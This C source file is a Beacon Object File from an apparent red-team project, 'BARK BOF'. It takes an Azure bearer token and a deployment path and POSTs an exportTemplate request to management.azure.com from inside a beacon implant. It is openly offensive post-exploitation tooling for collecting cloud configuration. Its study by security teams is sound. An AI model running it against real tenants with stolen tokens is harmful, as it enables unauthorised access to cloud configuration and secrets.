/*
 * export_azurerm_deployment_template.c — BARK BOF
 * Export-AzureRMDeploymentTemplate — Export the template for a deployment
 *
 * Args : token, deploymentPath
 *
 * deploymentPath example:
 *   /subscriptions/<subId>/resourcegroups/<rgName>/providers/Microsoft.Resources/deployments/<deploymentName>
 *
 * Author : BARK BOF project
 * License: GPLv3
 */
#include <windows.h>
#include <winhttp.h>
#include "../../include/beacon.h"
#include "../../include/http_utils.h"

void go(char *args, int alen)
{
    datap  parser;
    static char pathBuf[2048];
    LPWSTR widePath = NULL;
    char  *token = NULL;
    char  *deploymentPath = NULL;
    BeaconDataParse(&parser, args, alen);
    token          = BeaconDataExtract(&parser, NULL);
    deploymentPath = BeaconDataExtract(&parser, NULL);
    if (!token || MSVCRT$strlen(token) == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Usage: bark_export_azurerm_deployment_template <token> <deploymentPath>\n");
        return;
    }
    deploymentPath = SAFE_STR(deploymentPath);
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Export-AzureRMDeploymentTemplate: %s\n", deploymentPath);
    MSVCRT$sprintf_s(pathBuf, sizeof(pathBuf),
        "%s/exportTemplate?api-version=2025-04-01", deploymentPath);
    widePath = MbsToWcs(pathBuf);
    if (!widePath) { BeaconPrintf(CALLBACK_ERROR, "[-] Path conversion failed\n"); return; }
    BarkPost(L"management.azure.com", widePath, L"POST", "{}", token, "application/json");
    HFree(widePath);
}
